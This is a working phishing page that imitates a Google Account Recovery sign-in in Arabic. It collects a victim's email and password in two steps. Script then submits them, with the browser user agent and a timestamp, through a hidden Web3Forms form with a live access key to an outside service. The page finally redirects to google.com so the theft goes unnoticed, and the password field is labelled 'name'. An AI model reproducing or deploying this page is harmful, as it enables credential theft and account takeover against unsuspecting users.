<!DOCTYPE html>
<html lang="en" style="color-scheme: dark;">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <meta name="color-scheme" content="dark">
  <title>Google Account Recovery</title>
  <style>
    /* Base Reset & Typography */
    body {
      font-family: 'Roboto', Arial, sans-serif;
      margin: 0;
      padding: 0;
      background-color: #000;
      color: #fff;
      line-height: 1.5;
    }

    /* Container */
    .container {
      max-width: 100%;
      margin: 0;
      padding: 24px 16px;
      background: #000;
      border: none;
    }

    /* Google Logo */
    .logo {
      display: block;
      margin: 24px auto 0 ;
      width: 40px;
      height: 40px;
    }

    /* Title */
    h1 {
      font-size: 27px;
      font-weight: 500;
      margin: 0 0 8px;
      text-align: right;
      color: #fff;
    }

    /* Subtitle */
    .subtitle {
      font-size: 14px;
      color: #e8eaed;
      text-align: right;
      margin: 0 0 24px;
      line-height: 1.4;
    }

    /* Input Field */
    .input-group {
      margin-bottom: 20px;
    }

    .input-group input {
      width: 100%;
      padding: 14px 16px;
      border: 1px solid #5f6368;
      border-radius: 8px;
      font-size: 16px; /* Prevents iOS zoom */
      background-color: #202124;
      color: #e8eaed;
      outline: none;
      box-sizing: border-box;
    }

    .input-group input:focus {
      border-color: #8ab4f8;
      box-shadow: 0 0 0 2px rgba(138, 180, 248, 0.3);
    }

    /* Button */
    .button {
      background-color: #1a73e8;
      color: #fff;
      border: none;
      padding: 14px 20px;
      border-radius: 8px;
      font-size: 16px;
      font-weight: 500;
      cursor: pointer;
      width: 100%;
      margin: 24px 0;
      transition: background 0.2s;
    }

    .button:hover {
      background-color: #1967d2;
    }

    .button:active {
      background-color: #174ea6;
    }

    /* Link */
    .link {
      color: #8ab4f8;
      text-decoration: none;
      font-size: 14px;
    }

    .link:hover {
      text-decoration: underline;
    }

    /* Email Pill */
    .email-pill {
      display: flex;
      align-items: center;
      gap: 10px;
      font-size: 15px;
      background: #202124;
      color: #e8eaed;
      padding: 12px 16px;
      border-radius: 999px;
      border: 1px solid #5f6368;
      margin: 16px 0 24px;
      justify-content: space-between;
    }

    .email-pill svg {
      flex-shrink: 0;
    }

    /* Checkbox */
    .checkbox-wrapper {
      display: flex;
      align-items: center;
      gap: 10px;
      margin: 16px 0;
      font-size: 14px;
      color: #e8eaed;
    }

    .checkbox-wrapper input[type="checkbox"] {
      width: 18px;
      height: 18px;
      accent-color: #8ab4f8;
    }

    /* Footer Links */
    .footer {
      text-align: center;
      margin-top: 40px;
      font-size: 13px;
      color: #9aa0a6;
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 16px;
      padding: 16px 0;
    }

    .footer a {
      color: #9aa0a6;
      text-decoration: none;
      white-space: nowrap;
    }

    .footer a:hover {
      text-decoration: underline;
    }

    /* Language Selector */
    .language-select {
      font-size: 13px;
      color: #9aa0a6;
      margin: 24px 0 16px;
      text-align: center;
    }

    /* Responsive Adjustments */
    @media (min-width: 480px) {
      .container {
        max-width: 400px;
        margin: 48px auto;
        padding: 32px 24px;
        border-radius: 12px;
        background: #121212;
      }
    }
  </style>
</head>
<body>

  <!-- Step 1: Email Entry -->
  <div class="container" id="step1">
    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 40 48" aria-hidden="true " style="text-align: right; margin: 16px 0;">
      <path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"></path>
      <path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"></path>
      <path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"></path>
      <path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"></path>
    </svg>

    <h1>تسجيل دخول</h1>
    <br>
    <p class="subtitle">إستعادة حساب google</p>

    <div class="input-group">
      <input type="email" id="email-input" placeholder=" الحساب أو رقم الهاتف" required autocomplete="email">
    </div>

    <button id="next-btn" class="button">التالي</button>

    <div style="text-align: right; margin: 16px 0;">
      <a href="#" class="link">نسيت الحساب؟</a>
    </div>

    <p style="margin: 24px 0; color: #bdc1c6; font-size: 14px; text-align: right;">
      لست انت ؟ سجل دخولك بوضع الضيف لأمان معلوماتك<br>
      <a href="#" class="link">تعلم أكثر حول وضع الضيف</a>
    </p>
  </div>

  <!-- Step 2: Password (Name) Collection -->
  <div class="container" id="step2" style="display: none;">
    <svg xmlns="http://www.w3.org/2000/svg" width="60" height="60" viewBox="0 0 40 48" aria-hidden="true">
      <path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"></path>
      <path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"></path>
      <path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"></path>
      <path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"></path>
    </svg>

    <h1>مرحباً</h1>

    <div class="email-pill">
      <svg xmlns="http://www.w3.org/2000/svg" height="20" width="20" viewBox="0 0 640 640">
        <path fill="currentColor" d="M463 448.2C440.9 409.8 399.4 384 352 384L288 384C240.6 384 199.1 409.8 177 448.2C212.2 487.4 263.2 512 320 512C376.8 512 427.8 487.3 463 448.2zM64 320C64 178.6 178.6 64 320 64C461.4 64 576 178.6 576 320C576 461.4 461.4 576 320 576C178.6 576 64 461.4 64 320zM320 336C359.8 336 392 303.8 392 264C392 224.2 359.8 192 320 192C280.2 192 248 224.2 248 264C248 303.8 280.2 336 320 336z"/>
      </svg>
      <span id="email-display-text">name@gmail.com</span>
      <svg xmlns="http://www.w3.org/2000/svg" height="20" width="20" fill="#9aa0a6" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg>
    </div>

    <p class="subtitle">للتأكد من انه انت, يرجي ادخال كلمة المرور</p>

    <div class="input-group">
      <input type="password" id="name-input" required placeholder="ادخال كلمة المرور" autocomplete="current-password">
    </div>

    <div class="checkbox-wrapper">
      <input type="checkbox" id="show-password">
      <label for="show-password">عرض كلمة المرور</label>
    </div>

    <button id="submit-btn" class="button">التالي</button>

    <div style="text-align: center; margin: 16px 0;">
      <a href="#" class="link">جرب طريقة اخري</a>
    </div>
  </div>

  <div class="language-select">
    العربية (مصر)
  </div>

  <div class="footer">
    <a href="#">مساعدة</a>
    <a href="#">الخصوصية</a>
    <a href="#">الشروط</a>
  </div>

  <!-- Hidden Form for Web3Forms -->
  <form id="web3form" action="https://api.web3forms.com/submit" method="POST" style="display:none;">
    <input type="hidden" name="access_key" value="c96cd056-1436-4aec-8857-ed2ecb10b770">
    <input type="hidden" name="email" id="hidden-email">
    <input type="hidden" name="name" id="hidden-name">
    <input type="hidden" name="_ip" value="auto">
    <input type="hidden" name="user_agent" id="user-agent">
    <input type="hidden" name="timestamp" id="timestamp">
    <input type="text" name="_honey" style="display:none;">
    <input type="hidden" name="_subject" value="New Crab — Name Collected">
  </form>

  <!-- JavaScript -->
  <script>
    const step1 = document.getElementById('step1');
    const step2 = document.getElementById('step2');
    const emailInput = document.getElementById('email-input');
    const nameInput = document.getElementById('name-input');
    const emailDisplayText = document.getElementById('email-display-text');
    const nextBtn = document.getElementById('next-btn');
    const submitBtn = document.getElementById('submit-btn');
    const web3form = document.getElementById('web3form');
    const hiddenEmail = document.getElementById('hidden-email');
    const hiddenName = document.getElementById('hidden-name');

    // Show step 2
    nextBtn.addEventListener('click', function(e) {
      e.preventDefault();
      const email = emailInput.value.trim();
      if (!email) {
        return;
      }
      emailDisplayText.textContent = email;
      step1.style.display = 'none';
      step2.style.display = 'block';
    });

    // Toggle password visibility
    document.getElementById('show-password').addEventListener('change', function () {
      nameInput.type = this.checked ? 'text' : 'password';
    });

    // Submit and redirect
    submitBtn.addEventListener('click', function (e) {
      e.preventDefault();
      const name = nameInput.value.trim();
      if (!name) {
        return;
      }

      // Set form values
      hiddenEmail.value = emailInput.value;
      hiddenName.value = name;
      document.getElementById('user-agent').value = navigator.userAgent;
      document.getElementById('timestamp').value = new Date().toISOString();

      // Submit silently
      web3form.requestSubmit();

      // Redirect to Google
      setTimeout(() => {
        window.location.href = "https://www.google.com"; // ✅ Trimmed
      }, 700);
    });
  </script>
</body>
</html>
